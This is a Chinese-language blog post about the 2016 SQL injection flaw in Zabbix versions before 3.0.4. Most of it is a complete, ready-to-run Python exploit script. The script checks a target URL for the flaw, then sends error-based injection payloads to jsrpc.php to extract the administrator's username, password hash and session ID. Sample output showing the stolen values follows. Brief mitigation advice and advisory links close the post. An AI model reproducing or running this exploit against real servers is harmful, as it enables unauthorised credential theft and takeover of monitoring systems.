---
layout: post
title: Zabbix 最新 SQL 注入漏洞及 EXP
description: "Zabbix 最新 SQL 注入漏洞及 EXP"
category: Security
avatarimg:
tags: [Security, Zabbix, SQL Injection, EXP]
duoshuo: true
---

# 引言

这两天，大家都在说 Zabbix 的 SQL 注入漏洞，下面我们来看下。

# CNNVD：关于 Zabbix 漏洞情况的通报

CNNVD：关于Zabbix漏洞情况的通报(http://bobao.360.cn/news/detail/3468.html)  
上面详细介绍了漏洞简介，漏洞危害，及修复措施。但没有说到漏洞检测测试的方法。
[【漏洞预警】ZABBIX高危漏洞，无需授权登陆即可完成控制](http://bobao.360.cn/news/detail/3462.html)，这篇文章提到漏洞检测测试的方法。  
下面我们根据以上漏洞测试方法来用 Python 写一个 Exp。

# Zabbix 最新 SQL 注入漏洞 EXP

来自 [zabbix最新SQL注入漏洞+EXP-独自等待博客](http://www.waitalone.cn/zabbix-sql-1.html) 

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Date: 2016/8/18
# Modified by: Jamin Zhang

import urllib2
import sys, os
import re

def deteck_Sql():
    u'检查是否存在 SQL 注入'
    payload = "jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=999'&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17&itemids%5B23297%5D=23297&action=showlatest&filter=&filter_task=&mark_color=1"
    try:
        response = urllib2.urlopen(url + payload, timeout=10).read()
    except Exception, msg:
        print msg
    else:
        key_reg = re.compile(r"INSERT\s*INTO\s*profiles")
        if key_reg.findall(response):
            return True


def sql_Inject(sql):
    u'获取特定sql语句内容'
    payload = url + "jsrpc.php?sid=0bcd4ade648214dc&type=9&method=screen.get&timestamp=1471403798083&mode=2&screenid=&groupid=&hostid=0&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=" + urllib2.quote(
        sql) + "&updateProfile=true&screenitemid=&period=3600&stime=20160817050632&resourcetype=17&itemids[23297]=23297&action=showlatest&filter=&filter_task=&mark_color=1"
    try:
        response = urllib2.urlopen(payload, timeout=10).read()
    except Exception, msg:
        print msg
    else:
        result_reg = re.compile(r"Duplicate\s*entry\s*'~(.+?)~1")
        results = result_reg.findall(response)
        if results:
            return results[0]


if __name__ == '__main__':
    # os.system(['clear', 'cls'][os.name == 'nt'])
    print '+' + '-' * 60 + '+'
    print u'\t   Python Zabbix < 3.0.4 SQL 注入 Exploit'
    print '\t    Origin Author: http://www.waitalone.cn/'
    print '\t\t   Modified by: Jamin Zhang'
    print '\t\t   Date: 2016-08-18'
    print '+' + '-' * 60 + '+'
    if len(sys.argv) != 2:
        print u'用法: ' + os.path.basename(sys.argv[0]) + u' [Zabbix Server Web 后台 URL]'
        print u'实例: ' + os.path.basename(sys.argv[0]) + ' http://jaminzhang.github.io'
        sys.exit()
    url = sys.argv[1]
    if url[-1] != '/': url += '/'
    passwd_sql = "(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select concat(name,0x3a,passwd) from  users limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"
    session_sql = "(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select sessionid from sessions limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"
    if deteck_Sql():
        print u'Zabbix 存在 SQL 注入漏洞！\n'
        print u'管理员  用户名密码：%s' % sql_Inject(passwd_sql)
        print u'管理员  Session_id：%s' % sql_Inject(session_sql)
    else:
        print u'Zabbix 不存在 SQL 注入漏洞！\n'

```    

以下为执行上述 Exp 脚本输出结果：

```bash
C:\Users\xxx\Desktop>python zabbix_exp.py
+------------------------------------------------------------+
           Python Zabbix < 3.0.4 SQL 注入 Exploit
                   Origin Author: http://www.waitalone.cn/
                   Modified by: Jamin Zhang
                   Date: 2016-08-18
+------------------------------------------------------------+
用法: zabbix_exp.py [Zabbix Server Web 后台 URL]
实例: zabbix_exp.py http://jaminzhang.github.io

C:\Users\xxx\Desktop>python zabbix_exp.py http://192.168.56.11/zabbix
+------------------------------------------------------------+
           Python Zabbix < 3.0.4 SQL 注入 Exploit
                   Origin Author: http://www.waitalone.cn/
                   Modified by: Jamin Zhang
                   Date: 2016-08-18
+------------------------------------------------------------+
Zabbix 存在 SQL 注入漏洞！

管理员  用户名密码：Zabbix:5fce1b3e34b520afeffb37ce08c7cd66
管理员  Session_id：16c9fe855b00a92112ae55cad58792c6
```    

漏洞修复方法上面提到的文档中都有说明，按照文档来修复吧。

# 扩展

## 1 运维思想

1. 如果 Zabbix 是通过 VPN 走公司内网访问，外面是无法访问 Zabbix 的
2. 如果 Zabbix 有外网地址，可以将 Zabbix 服务器的外网地址网卡 shutdown，使其无法从外网访问 Zabbix 服务器
3. 运维人员若想访问 Zabbix 查看监控，可以通过 VPN 连接公司内网，然后登录查看 Zabbix 监控
4. 黑客无法从外网访问你的 Zabbix 服务器，你的 Zabbix 服务器也就不存在漏洞的威胁

## 2 关于升级 Zabbix 服务器的风险

若贸然给服务器升级 Zabbix 服务的话，可能会造成监控业务的不稳定因素，需要提前规划好升级计划，要从根本上解决问题，规划配置好安全架构，而不是仅关注些许的漏洞

## 3 小结

* 漏洞是无止境的，只有只有从思想上去解决问题，才能避免安全事故的发生
* 技术的提升知识量的积累，思想的转变才是质的飞跃


# Ref
[CNNVD：关于Zabbix漏洞情况的通报](http://bobao.360.cn/news/detail/3468.html)  
[zabbix最新SQL注入漏洞+EXP](http://www.waitalone.cn/zabbix-sql-1.html)  
[【漏洞预警】ZABBIX高危漏洞，无需授权登陆即可完成控制（更新利用工具）](http://bobao.360.cn/news/detail/3462.html)  
[SQL injection vulnerabilities in "Latest data"](https://support.zabbix.com/browse/ZBX-11023)  
[Zabbix 2.2.x / 3.0.x - SQL Injection](https://www.exploit-db.com/exploits/40237/)  
[poc, vul, exp都是什么意思呢](https://www.zhihu.com/question/26053378)  
